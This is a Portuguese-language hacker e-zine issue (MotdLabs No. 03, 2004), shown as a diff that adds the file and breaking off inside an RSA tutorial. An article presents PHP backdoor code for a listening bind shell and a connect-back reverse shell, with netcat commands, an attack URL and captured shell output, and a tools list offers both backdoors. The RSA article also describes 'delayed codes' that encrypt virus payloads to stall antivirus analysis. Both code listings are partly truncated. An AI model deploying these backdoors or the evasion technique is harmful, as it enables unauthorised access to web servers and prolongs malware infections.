@@ -1,0 +1,4133 @@
+                                          dP         dP
+                                               88         88
+                         88d8b.d8b. .d8888b. d8888P .d888b88
+                         88'`88'`88 88'  `88   88   88'  `88
+                         88  88  88 88.  .88   88   88.  .88
+                         dP  dP  dP `88888P'   dP   `88888P8
+
+                                          oo       dP
+                                                   88
+                        .d8888b. dP    dP dP .d888b88 .d8888b.
+                        88'  `88 88    88 88 88'  `88 88ooood8
+                        88.  .88 88.  .88 88 88.  .88 88.  ...
+                        `8888P88 `88888P' dP `88888P8 `88888P'
+                             .88                    Número 03
+                         d8888P
+
+E-zine lançada oficialmente dia 12 de Outubro de 2004.
+
+http://www.motdlabs.org
+http://www.orkut.com/Community.aspx?cmm=114799
+contato@motdlabs.org
+irc.freenode.org   	/join #motd
+
+ATENÇÃO: O  MotdLabs adverte  que não  será responsável  por qualquer tolice que
+você venha a fazer.  Estou certo de que  estará consciente que ao  tentar por em
+prática quaisquer técnicas descritas no decorrer desta zine, você poderá se  dar
+mal. Ela foi criada apenas para propósitos educacionais e cabe a você decidir  o
+que  fará com esse poder em suas mãos. Só não venha reclamar que se deu mal  por
+ter   feito  algo  que aprendeu  nesta  mesma.  Obrigado pela  a  atenção  e boa
+leitura!!! :)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=[ Colaboradores ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+bashX......................................................bashx@click21.com.br
+
+BlackSh33p................................................sheep1826@hotmail.com
+
+inferninho..............................................inferninho@yahoo.com.br
+
+IP_FIX......................................................ip_fix@motdlabs.org
+
+Narcotic..................................................narcotic@motdlabs.org
+
+RoOtLiQuiD..............................................rootliquid@motdlabs.org
+
+SkyNet45..................................................skynet45@motdlabs.org
+
+tDs............................................................tds@motdlabs.org
+
+_tzlord_................................................rodrigo-lord@bol.com.br
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=[ Índice ]-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[ 01 ] Introdução                                          (by IP_FIX)
+[ 02 ] Malícia é o mais importante 			   (by tDs)
+[ 03 ] Criptografia RSA - Algoritmos e Implementações 	   (by RoOtLiQuiD)
+[ 04 ] Shellcode em PHP                                    (by tDs)
+[ 05 ] Detonando HoneyPots em Linux 			   (by SkyNet45)
+[ 06 ] Slackware sem medo 				   (by _tzlord_)
+[ 07 ] Sockets in Perl for dummies                         (by BlackSh33p)
+[ 08 ] Nós ainda estamos ganhando...			   (by bashX)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=[ Ferramentas ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+[Enumereitor-0.1]..........Enumera Hosts Válidos............(by inferninho)
+[Steck-0.2].................Backdoor em PHP.................(by tDs)
+[Steno]...................Steganografia em HTML.............(by Narcotic)
+[RevSteck-0.2].............Connect-Back em PHP..............(by tDs)
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[01]-=[Introdução]=-|IP_FIX|=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+	Senhores! Como vão? =)
+
+        Estamos aqui novamente compartilhando informações sobre hacking/security
+	para a comunidade, todos que estejam interessados. Como de costume esta
+	e-zine é destinada aos newbies, fuçadores e curiosos em geral.
+
+	Infelizmente não ocorreu o H2HC na data prevista, mas em breve o evento
+	irá se realizar. Sobre a e-zine, apesar de o conteúdo estar inferior da
+	edição passada, o conteúdo está muito bom. Para muitos não foi possível
+	entregar determinados artigos devido a falta de tempo, pois quase todos
+	trabalham e estudam, dificultando o empenho no grupo.
+
+	Mas estamos na ativa! Sempre colaborando na mail-list quando possível e
+	com frequência no canal #motd da freenode. Agradecemos ao Clube dos
+	Mercenários e ao Front The Scene pelo apoio e ajuda. Estamos abertos
+	também a todos que queiram ajudar compartilhando informações em especial
+	pra e-zine, que é algo que vem sendo esperado por muitos.
+
+	É, tempos difíceis e duros, espero que aproveitem e critiquem sobre o ela
+	em geral. Sem mais o que falar... Façam bom aproveito!
+
+	HACKING FOREVER!!!
+
+	Abraços,
+
+	IP_FIX.
+
+Nossos parceiros r0x!
+
+Clube dos Mercenários:
+http://cdm.frontthescene.com.br
+http://br.groups.yahoo.com/group/mercenariesclub/
+irc.freenode.org 		/j #mercenaries
+
+Front The Scene:
+http://www.frontthescene.com.br
+http://br.groups.yahoo.com/group/frontthescene/
+irc.freenode.org		/j #fts
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[02]-=[Malícia é o mais importante]-=|tDs|=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+________________
+| [1] INTRODUCAO |
+`================
+Poderia bem colocar outro titulo neste texto, mas... Bom, isto nao vem ao
+caso. O que importa e' neste momento e', como citou Einsten:
+
+"A imaginação e' mais importante que o conhecimento."
+
+___________
+| [2] O QUE |
+`===========
+A utilizacao de PHP vem aumentando a uma velocidade muito grande. Com
+isso, o numero de utilizadores tambem aumenta, mas em muitos casos apenas
+os recursos basicos desta linguagem sao utilizados.
+Mas o que pode PHP fazer? Com PHP voce pode, entre outras coisas:
+
+- Fazer operacoes matematicas;
+- Criar aplicativos que rodem via linha de comando;
+- Criar aplicativos que utilizem GUI (Graphic User Interface);
+- Criar imagens;
+- Criar documentos PDF;
+- Trabalhar com memoria compartilhada/IPC;
+- Manipular processos;
+- ...
+- Utilizar sockets;
+
+OTIMO! Posso utilizar sockets.
+
+__________________________
+| [3] INTRODUCAO, PARTE II |
+`==========================
+Se as configuracoes do PHP estivem bem feitas, a utilizacao dele de forma
+maliciosa pode se tornar um pouco mais complicado. Mas deixando de lado o
+pessimismo, vamos supor que a configuracao nao seja das melhores (nao esteja
+bem configurado). Vamos brincar um pouco com ele entao.
+
+Algumas funcoes nativas do php para execucao de programas sao:
+
+exec - Executa um programa externo
+passthru - Executa um programa externo e mostra a saida crúa
+proc_open - Executa um comando e abre ponteiros de arquivos para
+entrada/saída
+shell_exec - Executa um comando via shell e retorna a saída inteira
+system - Executa um programa externo e mostra a saída
+backtick operator, que e' um comando entre o sinal de acento grave
+(`uname -a`).
+
+Consegue enxergar algo ai? Continuando, temos tambem as funcoes para
+manipulacao de sockets. Vejamos algumas:
+
+socket_create - Create a socket (endpoint for communication)
+socket_bind - Binds a name to a socket
+socket_listen - Listens for a connection on a socket
+socket_accept - Accepts a connection on a socket
+socket_write - Write to a socket
+
+A visao esta clareando? Se podemos executar comandos e podemos criar
+sockets, por que nao podemos unir o util ao agradavel; criar um socket que
+escute na porta X, aguarde conexoes do endereco Y e execute os comandos por
+ele enviados?
+A resposta e': MAS NOS PODEMOS...
+
+_________________________
+| [4] INICIO DA DOMINACAO |
+`=========================
+Temos o seguinte cenario (isso nao aconteceu):
+Contratei uma empresa de hosting para hospedar meu site, sem segundas
+intencoes. Apos algumas verificacoes, notei que nem tudo estava bem configurado
+por ali. Escrevi entao um script que criava um socket, e ficava escutando na
+porta 10001. O script e' o seguinte:
+
+-----backdoor.php-------------------------------------------------------------
+&1";
+$stcexe = shell_exec ($stcbuf);
+$stcexe = str_replace ("\n", "\n\r", $stcexe);
+socket_write ($stcSockFD, $stcexe, strlen ($stcexe));
+}
+$stcmsgRet = STCShellMsg ();
+socket_write ($stcSockFD, $stcmsgRet, strlen ($stcmsgRet));
+} while (true);
+socket_close ($stcSockFD);
+} while (true);
+socket_close ($stcsock);
+}
+STC_bDoor ();
+?>
+----------------------------------------------------------------------------
+
+Depois de criar o script, coloquei ele no meu site, e o acessei (o endereco
+dele era http://www.site.com/backdoor.php). O script ficou rodando, sem nenhuma
+mensagem. Ai entao tentei, via telnet, acessar o endereco site.com na porta
+10001. O que aconteceu?
+
+tds@matrix:/$ telnet site.com 10001
+Trying 241.242.243.244 ...
+Connected to site.com.
+Escape character is '^]'.
+uname -a
+Linux site.com 2.4.22 #6 Tue Sep 2 17:43:01 PDT 2003 i686 unknown unknown
+GNU/Linux
+steck@motdlabs:/usr/local/apache2/htdocs/site.com/$
+
+Legal, uma shell. Estou nela atraves de uma backdoor escrita em php. Muito
+bom! E apenas o comeco.
+
+_________________________________
+| [5] NOVAS IDEIAS/MAIS BACKDOORS |
+`=================================
+Tudo vai bem quando se esta bem. Apos alguns testes e depois de mais um
+tempo de desenvolvimento, a backdoor foi aprimorada (o fonte dela esta
+disponivel para download, veja nos links, ao final do texto). Apos alguns dias
+utilizando-a, notei que nao estava funcionando em diversos servidores, nao por
+falha no codigo ou por boa configuracao dos servidores, mas pura e simplesmente
+gracas a alguns firewalls atrapalhando. Pronto. Havia acabado a diversao.
+
+_____________________________________________
+| [6] PHP MAL CONFIGURADO + FIREWALL != SHELL |
+`=============================================
+Apos executar a backdoor, notava-se que ela realmente estava funcionando
+(tinha uma outra forma de acesso ao servidor, mas queria mesmo uma shell), e
+estava escutando na porta 10001. Mas por que entao nao tinha acesso via telnet
+a ela? UM FIREWALL, OBVIO. Deveria ter um firewall que rejeitasse qualquer
+pedido de conexao a portas diferentes de 80. Seria o fim? Ainda nao.
+
+______________________________________________________
+| [7] PHP MAL CONFIGURADO + FIREWALL + MALICIA = SHELL |
+`======================================================
+Se nao se pode conectar em nenhuma porta que nao seja a 80, nao podemos
+"solicitar" que o servidor conecte-se a uma maquina que determinar-mos? Seria
+mais ou menos assim:
+
+Estamos aqui Entraremos aqui
+++++++++ ++++++++++
++ + + +
+
++ HOST A + + SERVIDOR +
++ + + +
+++++++++ ++++++++++
+
+a) HOST A agurda por uma conexao na porta 44321;
+b) SERVIDOR executa script em php que conecta-se a HOST A na porta 44321;
+c) Assim que recebe a conexao de SERVIDOR, HOST A esta pronto para executar
+"o que quiser";
+
+Na pratica, pode ser feito da seguinte forma:
+
+a) HOST A executa netcat, para aguardar conexoes na porta 44321 no endereco ip
+245.246.247.248, que e' o seu endereco:
+
+tds@matrix:/$ nc -l -p 44321 -s 245.246.247.248
+
+b) SERVIDOR executa o seguinte script:
+
+-----backdoor2.php------------------------------------------------------------
+\n\r";
+die;
+}
+while ($rstflag) {
+$rstbuf = fgets ($rstcon, 1024);
+if (!$rstbuf = trim ($rstbuf)) { continue; }
+if ($rstbuf == 'exit') {
+unset ($rstflag);
+break;
+}
+if (substr_count ($rstbuf, "cd") && strpos ($rstbuf, " ") == 2) {
+$rstexe = chdir (str_replace ("cd ", "", $rstbuf));
+} else {
+if (substr_count ($rstbuf, "ls") && ((
+strpos ($rstbuf, " ") == 2) ||
+strlen ($rstbuf) == 2)) {
+}
+$rstbuf .= " 2>&1";
+$rstexe = shell_exec ($rstbuf);
+$rstexe = str_replace ("\n", "\n\r", $rstexe);
+fwrite ($rstcon, $rstexe, strlen ($rstexe));
+}
+$rstmsgRet = RSTShellMsg();
+fwrite ($rstcon, $rstmsgRet, strlen ($rstmsgRet));
+}
+fclose ($rstcon);
+}
+RSTRevSteck ();
+?>
+----------------------------------------------------------------------------
+
+O acesso a ele ficaria entao assim:
+http://www.servidor.com/backdoor2.php?rstpo=44321&rstip=245.246.247.248
+
+c) De volta ao terminal, onde foi executado o netcat temos:
+
+tds@matrix:/$ nc -l -p 44321 -s 245.246.247.248
+CONECTADO!
+id
+uid=1006(apache) gid=103(apache) groups=103(apache)
+revsteck@motdlabs:/usr/local/apache2/htdocs/servidor.com$uname -a
+Linux servidor.com 2.4.22 #6 Tue Mar 5 12:51:07 PDT 2003 i586 unknown
+unknown GNU/Linux
+revsteck@motdlabs:/usr/local/apache2/htdocs/servidor.com/$
+
+Parece brincadeira, mas e' serio. A quantidade de servidores internet afora
+vulneraveis nao e' pequena. Uma versao melhorada do script exposto acima esta
+disponivel para download, veja nos links, ao final do texto.
+
+_____________________________
+| [8] TERMINANDO DA DOMINACAO |
+`=============================
+Uma vez dentro, a chance de elevacao de privilegios e' bastante grande.
+Mesmo utilizando apenas php para isso. Pode parecer utopico, mas nao e'. Mas
+isso fica para um proximo texto... Em breve.
+
+___________
+| [9] LINKS |
+`===========
+http://tds.motdlabs.org/myhome/index.php?nav=1&snav=5 - Backdoor em php
+http://tds.motdlabs.org/myhome/index.php?nav=1&snav=6 - Backdoor em php,
+utilizando conceitos de connect-back
+
+http://www.motdlabs.org
+http://cdm.frontthescene.com.br
+http://www.frontthescene.com.br
+/j #motd -> irc.freenode.net
+
+___________________________
+| [10] CONSIDERACOES FINAIS |
+`===========================
+Seria mais facil se eu conseguisse organizar meus pensamentos em palavras
+de maneira mais intuitiva, mas tudo bem... Espero que ao menos tenha sido
+compreensivel o que escrito. Caso nao tenha, estou a disposicao para trocar
+ideias sobre o assunto.
+
+Longe de esgotar os assuntos (php e malicia), apenas uma breve introducao
+nos mesmos. Nota-se o poder que pode ter um script em php apenas com os
+mostrados acima. Mas muito alem disso, uma arma com grande poder e' a malicia.
+Se teu programa nao pode entrar, peca para algum que possa carrega-lo para
+voce. Se 3 + 3 nao esta dando certo, tente 2 + 4, 1 + 5, outras formas de
+chegar ao objetivo... Mas o mais importante e' enxergar alem do alcance dos
+olhos, onde acredita-se nao ter nada... Enxergar alem do final.
+
+"Tudo da certo no fim, se não deu é porque ainda não chegou no fim"
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+=-[03]-=[Criptografia RSA - Algoritmos e Implementações]-=|RoOtLiQuiD|=-=-=-=-=
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+--------------------------------------------------------------------------------
+
+CRIPTOGRAFIA RSA
+ALGORITMOS E IMPLEMENTACOES
+
+By RoOtLiQuiD
+rootliquid@m...
+www.motdlabs.org
+
+--------------------------------------------------------------------------------
+
+-------------
+INDICE:
+-------------
+
+1.0 :: INTRODUCAO CHATA QUE NINGUÉM LÊ ............................... LINE 39
+2.0 :: Breve comentário sobre Curvas Elípticas ....................... LINE 100
+3.0 :: Introducao ao RSA ............................................. LINE 128
+4.0 :: Funcionamento do RSA .......................................... LINE 212
+4.1 :: Gerando as chaves ............................................. LINE 220
+4.2 :: Encriptando ................................................... LINE 283
+4.3 :: Desencriptando ................................................ LINE 308
+4.4 :: Resumo do funcionamento do RSA ................................ LINE 325
+5.0 :: Breve Comentário sobre "DELAYED CODES" ........................ LINE 360
+6.0 :: SOURCE CODES .................................................. LINE 403
+6.1 :: Simple RSA in C ............................................... LINE 432
+6.2 :: Simple RSA in LISP ............................................ LINE 720
+6.3 :: COMPLETE RSA IN C USING GNU MP LIBRARY ........................ LINE 907
+
+--------------------------------------------------------------------------------
+1.0 :: INTRODUCAO CHATA QUE NINGUÉM LÊ
+--------------------------------------------------------------------------------
+
+Como vc jah deve saber, a criptografia eh a arte de trasnformar informacoes
+em MULHER, ou seja, algo que vc realmente nao consegue entender.
+
+Existem dois tipos de criptografia, a chamada Criptografia Simétrica, e
+Assimétrica.
+
+-------------------------------
+..:: Criptografia Simétrica :
+-------------------------------
+
+Durante a primeira guerra mundial o cientista Gilbert Vernam inventou
+um método para esconder as mensagens enviadas às tropas.
+
+Uma palavra ou frase qualquer aleatoriamente escolhida servia de chave para
+esconder qualquer texto. O método era bem simples, as duas pessoas que queriam
+se comunicar deveriam ter essa mesma chave, e cada vez que uma fosse enviar um
+texto para a outra, deveria ser feita uma operação lógica de XOR da chave com o
+texto, assim os dados do texto ficavam "misturados" com a chave, não sendo
+possível distinguir os dois. Para decifrar o texto, a outra pessoa deveria
+possuir a mesma chave, bastando para isso apenas fazer o XOR novamente no texto
+cifrado fazendo-o virar novamente o texto original.
+
+Esse método é chamado de simétrico porque os dois lados da comunicação
+precisam ter a mesma chave, exatamente igual, tanto para encriptar, quanto para
+desencriptar. Isso é um grande problema pois vc precisa entregar essa chave de
+modo seguro a pessoa certa, pois qualquer um que tiver a mesma chave poderá
+decifrar a mensagem. Apesar disso, ainda hoje ele é usado, pois com esse método
+podemos encriptar dados em O(1), pois basta uma operação (XOR) para cada bit a
+ser encriptado, no método assimétrico a coisa jah eh bem diferente...
+
+Para gerar chaves para criptografia simétrica existem muitos algoritmos como
+o DES, MD5, SHA, etc...
+Particularmente quem se interessar pode dar uma olhada no algoritmo SKIPJACK
+da NSA, veja mais em: http://www.tropsoft.com/strongenc/skipjack.htm
+ou procure no google: Skipjack NSA algorithm
+
+---------------------------------
+..:: Criptografia Assimétrica :
+---------------------------------
+
+Nela, vc tem duas chaves, uma chamada de chave pública, que eh usada apenas
+para encriptar os dados e com ela não eh possível desencripta-los, e uma chave
+chamada de privada, que eh usada para desencriptar os dados. Nesse método você
+entrega para a outra pessoa a sua chave pública para que ela possa te mandar
+mensagens cifradas com a sua chave.
+
+Para você mandar mensagens cifradas para a outra pessoa você precisa da
+chave pública dela, e vice-versa. Na criptografia assimétrica os dados não são
+encriptados com XOR, mas sim com cálculos matemáticos, e por isso encriptar uma
+grande quantidade de dados com esse método pode ser muito lento.
+
+A criptografia RSA usa o método assimétrico, eu vou explicar como funciona,
+mas antes um breve comentário sobre as Curvas Elípticas (que também usam o
+método assimétrico).
+
+--------------------------------------------------------------------------------
+2.0 :: Breve comentário sobre Curvas Elípticas
+--------------------------------------------------------------------------------
+
+Atualmente o que há de mais avançado em cifragem de dados eh a criptografia
+baseada em Curvas Elípticas. O único algorimto que conheço que usa isso,
+chama-se ECC.
+
+Para o RSA, o tamanho do problema é o tamanho do módulo que deve ser
+fatorado. Já nas curvas elípticas, o tamanho do problema é o número de pontos N
+no grupo em que se está trabalhando.
+
+A segurança das curvas elípticas se baseia na intratabilidade do problema do
+logaritmo discreto em grupos aritméticos definidos sobre os pontos de uma curva
+elíptica (Caraio! Foda hein!). Oferece o mesmo nível de segurança que os
+sistemas baseados em corpos de inteiros como o RSA, mas com tamanho de chave
+menor.
+
+Um ECC de 160 bits equivale a um sistema RSA de 1024 bits (Putz!!!).
+
+Para mais informações sobre Criptografia baseada em Curvas Elípticas acesse:
+http://www.lockabit.coppe.ufrj.br/downloads/academicos/ECCMono.pdf
+Ou então digite no google Criptografia+Curvas+Elípticas
+
+--------------------------------------------------------------------------------
+3.0 :: Introducao ao RSA
+--------------------------------------------------------------------------------
+
+O algoritmo RSA foi inventado pelos professores do MIT: Ronald L. Rivest,
+Adi Shamir, e Leonard Adleman em 1977.
+
+A empresa RSA Security que originalmente era controlada pelos inventores,
+detêm a patente do algoritmo. Mas pelo que eu sei essa bosta de patente soh eh
+válida nos EUA, portanto pode ficar tranquilo que o FBI não vai bater à sua
+porta porque vc fez um programa que usa esse algoritmo!
+
+Leia mais sobre essa patente em:
+http://www.cyberlaw.com/rsa.html
+Ah, eu ouvi dizer que essa patente expirava em junho de 2000, soh que eu
+não consegui achar nada que confirmasse... Se alguem souber ....
+
+Como jah foi dito, o RSA usa criptografia assimétrica. Para que haja
+segurança nesse método, devemos ter um algoritmo que gera uma chave pública e
+uma privada de modo que seja impossível (ou quase, hehe) de determinar a chave
+privada mesmo sabendo a chave pública.
+
+Para isso, a chave pública eh gerada através de uma "one-way function", uma
+função matemática onde dado uma certa entrada eh relativamente fácil de
+determinar o resultado, porém sabendo o resultado, eh praticamente impossível
+determinar a entrada.
+
+Matematicamente falando: dado X, computamos F(x) facilmente, porém , dado
+F(x), eh impossível computar X.
+Funções não inversíveis são um exemplo de uma "one-way function".
+
+No caso do RSA, a função usada eh a multiplicação de dois números primos.
+Dae, vc deve estar pensando: "mas essa função eh inversível, se eu fatorar o
+resultado eu acho os dois números primos". Pois eh, isso funciona se tivermos
+números pequenos, como 7 e 13, que dá 91. Se dividirmos 91 por todos os primos
+anteriores vamos acabar descobrindo que 91/13 dah 7 e não sobra resto, o que
+quer dizer que encontramos a entrada (7 e 13).
+
+Apesar dessa função ser inversível, se multiplicarmos números primos muito
+grandes, a quantidade de números que precisaremos testar para descobrir a
+entrada vai ser tão grande, que torna esse trabalho impraticável. Por isso, para
+que essa função seja segura, devemos estar certos de que os dois números
+escolhidos são realmente primos e que sejam números muito grandes.
+
+Por exemplo, quando dizemos que estamos trabalhando com uma chave de 1024
+bits no RSA, isso quer dizer, que a chave pública tem 1024 bits, ou seja,
+precisamos de 1024 bits para representar o número que foi gerado pela
+multiplicação dos dois primos, portanto cada número primo deveria ter 512 bits.
+
+Para se ter uma idéia, um número de 1024 bits é da ordem de 1 x 10^308 na
+representação decimal, imagine quantos números antes desse devemos testar para
+encontrar os dois números primos que o geraram!!! Com o computador que está na
+sua frente agora, você levaria mais tempo do que a idade do universo para
+conseguir fatorar esse número, heheheh que exagero, na verdade eu não sei quanto
+tempo levaria, mas seria tanto tempo que mesmo com os computadores mais modernos
+exitentes, fatorar esse número seria uma tarefa quase impossível. O problema, eh
+que com a computação quântica, o poder computacional seria aumentado muito, pois
+seria possível fazer vários cálculos ao mesmo tempo usando os vários estados que
+podem ter um qbit.
+Certamente a criptografia atual não eh páreo para a computação quântica. Um
+cálculo que no computador comum poderia levar milhares de anos para ser
+concluído, com um processador quântico esse tempo pode ser reduzido para
+algumas horas.
+
+Para tentar driblar esse problema de fatorar uma multiplicação de dois
+números primos existem algoritmos e teoremas que otimizam e diminuem o trabalho,
+não sendo preciso testar o número com todos os primos anteriores, porém ainda
+assim não foi encontrada uma fórmula que consiga fatorar números grandes de
+forma suficientemente eficiente para que ameace a criptografia atual.
+
+Na prática para se fazer um sistema de criptografia seguro que usa o RSA,
+você vai enfrentar 3 problemas principais:
+
+o) Como pegar dados verdadeiramente aleatórios, para gerar os
+números primos.
+o) Como saber se um número qualquer eh realmente primo.
+o) Como fazer cálculos numéricos com números de representação
+maior que 32 bits.
+
+Mais a frente isso será eplicado.
+
+--------------------------------------------------------------------------------
+4.0 :: Funcionamento do RSA
+--------------------------------------------------------------------------------
+
+O algoritmo RSA eh muito simples, ele usa apenas 3 fórmulas matemáticas, uma
+para gerar as chaves,uma para encriptar, e outra para desencriptar.
+
+--------------------------------------------------
+4.1 :: Gerando as chaves
+--------------------------------------------------
+
+Primeiro devemos gerar a chave publica e a privada, essa eh a parte mais
+complicada.
+Para gerar as chaves devemos ter dois números primos aleatórios P e Q.
+
+-----------------------
+..:: A chave pública:
+-----------------------
+
+A chave pública eh composta por dois números, N e E.
+
+O número N eh a multiplicação dos dois números primos P e Q:
+
+N = P * Q
+
+Para calcular o número E , precisamos ainda calcular outro número que vai
+nos auxiliar, o número PHI. Que eh calculado pela multiplicacao dos dois primos
+menos 1, veja:
+
+PHI = (P-1)*(Q-1)
+
+O número E deve ser calculado de maneira que o MDC (máximo divisor comum)
+entre E e PHI seja 1, ou seja, de maneira que E seja relativamente primo de PHI.
+
+O número E deve satisfazer a condição:
+
+MDC( E, PHI ) == 1
+Para conseguir fazer isso, vamos ter que usar algumas gambiarras
+matemáticas.
+
+OBS: O número E , sempre resulta num número pequeno (com um pequeneo # de
+bits)
+como 3, 17, 50003 e etc..
+
+A chave pública são apenas os númeors E e N, o PHI não deve de maneira
+nenhuma ser fornecido, pois com ele geramos o número D que eh a chave privada.
+
+-----------------------
+..:: A chave privada:
+-----------------------
+
+A chave privada eh composta pelo número D e o N também.
+
+O número D eh o número que multiplicado por E, módulo PHI, eh igual a 1,
+ou seja:
+O númer D deve satisfazer a condição:
+
+( E*D ) % PHI == 1
+
+O D eh também chamado de o inverso de E módulo PHI.
+No código exemplo eu calculo isso usando o "Bizarre Extended Euclidian
+Algorithm" ;-) Mas eu não sei bem como esse treco funciona, eu soh peguei o
+algoritmo no google e usei! hehehe, eu sou um geek nao um matemático pervertido!
+Veja mais em: http://www.grc.nasa.gov/WWW/price000/pfc/htc/zz_xeuclidalg.html
+
+--------------------------------------------------
+4.2 :: Encriptando
+--------------------------------------------------
+
+Para encriptar qualquer tipo de dados, seja texto, imagem ou o que for, vc
+deverá transformar tudo em números, trabalhando com 32 bits, fica fácil de fazer
+
+isso, basta pegar 4 bytes de cada vez dos dados que vc quer encriptar. O número
+deve ser sempre unsigned long.
+
+Para encriptar uma mensagem qualquer, convertemos ela em um número M, e
+fazemos o seguinte cálculo:
+
+Mensagem encriptada (C) eh igual a (Mensagem Original elevado a E) módulo N:
+
+C = M^E mod N
+
+Devemos fazer isso para todos os pedaços da mensagem. Se dividirmos uma
+mensagem de 20 bytes em 5 partes de 4 bytes, devemos fazer isso 5 vezes e
+guardar separadamente o número encriptado que foi gerado.
+
+Veja que na encriptação usamos os dois números gerados para a chave
+pública, o N e o E.
+
+--------------------------------------------------
+4.3 :: Desencriptando
+--------------------------------------------------
+
+Para desencriptar a mensagem basta fazer o seguinte cálculo:
+
+Mensagem Original eh igual (Mensagem Encriptada elevada a D) módulo N.
+
+M = C^D mod N
+
+Depois de feito isso vc terá o número M original que faz parte da mensagem.
+
+Veja que para desencriptar precisamos saber o número D gerado para a chave
+pública e o N.
+
+--------------------------------------------------
+4.4 :: Resumo do que acabou de ser dito
+--------------------------------------------------
+
+Gerando as chaves:
+
+Chave Pública: E e N
+Chave Privada: D e N
+
+N = P * Q
+PHI = (P-1)*(Q-1)
+E satisfaz a condição: MDC( E, PHI ) == 1
+D satisfaz a condição: ( E*D ) % PHI == 1
+
+Encriptando:
+C = M^E mod N
+
+Desencriptando:
+M = C^D mod N
+
+Observe que para desencriptar vc precisa saber o número D, e para saber o
+número D vc precisa saber o número PHI, e para saber o número PHI vc precisa
+saber os primos P e Q.
+Portanto, esses números não devem de forma alguma serem revelados para
+terceiros.
+Obtendo quaisquer um dos números D, PHI, P e Q vc pode desencriptar a
+mensagem.
+
+Na chave pública, eh distribuído apenas os números E e N, o método mais
+comum para se atacar uma criptografia RSA eh tentar fatorar o número N (que eh
+conhecido) nos dois números primos P e Q para que assim se possa gerar a chave
+privada D.
+
+--------------------------------------------------------------------------------
+5.0 :: Breve Comentário sobre "DELAYED CODES"
+--------------------------------------------------------------------------------
+
+Deve-se notar que o tempo de processamento necessário para encriptar é
+muitas vezes menor do que o tempo necessário para desencriptar. Isso se deve
+por que na desencriptação, elevamos um número grande C ao expoente D que também
+eh um número grande, enquanto na encriptação elevamos um número grande M ao
+expoente E, que como vimos anteriormente, eh um numero pequeno, portanto o
+cálculo eh muito mais rápido. Essa característica do RSA eh pervertidamente
+aproveitada para gerar os chamados "DELAYED CODES".
+
+Quando surge um novo vírus, rapidamente os fabricantes de anti-vírus criam
+um código para detectá-lo e depois de algum período de tempo, todos os
+computadores infectados serão curados, o "DELAYED CODE" é usado para prolongar
+o período de tempo que os computadores ficam infectados.
+
+Para que o anti-vírus não detecte o vírus pode-se mudar partes do código do
+vírus ou alguma característica do vírus após 2 meses por exemplo. Mas nesse caso
+o anti-vírus poderia ter duas versões da vacina, sendo uma com o código
+modificado, aí eh que entra o Delayed Code. Para esconder o código fará a
+modificação basta criptografá-lo de maneira que demore 2 meses (ou qualquer
+período de tempo) para descriptografar.
+
+Usando o RSA, encripta-se n vezes o código a ser escondido, e coloca-se
+a chave privada junto do código original do vírus, usando a chave privada o
+próprio vírus pode descriptografar o código escondido, ou ainda, os próprios
+fabricantes de anti-vírus podem descriptografar, porém, levará 2 meses para
+conseguir isso, pois o código foi encriptado n vezes e terá que ser
+descriptografado o mesmo número de vezes, como o tempo de encriptação eh muitas
+vezes menor do que o de desencriptação, isso torna possível gerar um código
+que leva algumas horas ou dias para criptografar mas leva meses para
+descriptografar. Com isso , consegue-se atrasar a análise do código do vírus
+para que este possa ter mais tempo para infectar computadores.
+
+Essa eh a idéia básica do Delayed Code, para saber mais detalhes leia:
+http://z0mbie.host.sk/dpgn_eng.txt
+
+--------------------------------------------------------------------------------
+6.0 :: SOURCE CODES
+--------------------------------------------------------------------------------
+
+Os topicos seguintes trazem codigos de programas que eu fiz para implementar
+a criptografia RSA de 3 maneiras.
+
+Na primeira ( 6.1 ) eu fiz de maneira simples usando apenas as funcoes
+aritmeticas padrao do C e sem otimizar nada, por isso eh lento e nao consegue
+gerar chaves RSA maiores que 32 bits, e gera numeros primos aleatorios (devem
+ser definidos com #define antes).
+
+Na segunda ( 6.2 ) eu fiz usando os mesmos algoritmos usandos na 6.1, ou
+seja, sem otimizacao nenhuma, mas eu fiz em LISP e por isso podemos usar a
+aritimetica de precisao infinita que a propria linguagem tem, e portanto podemos
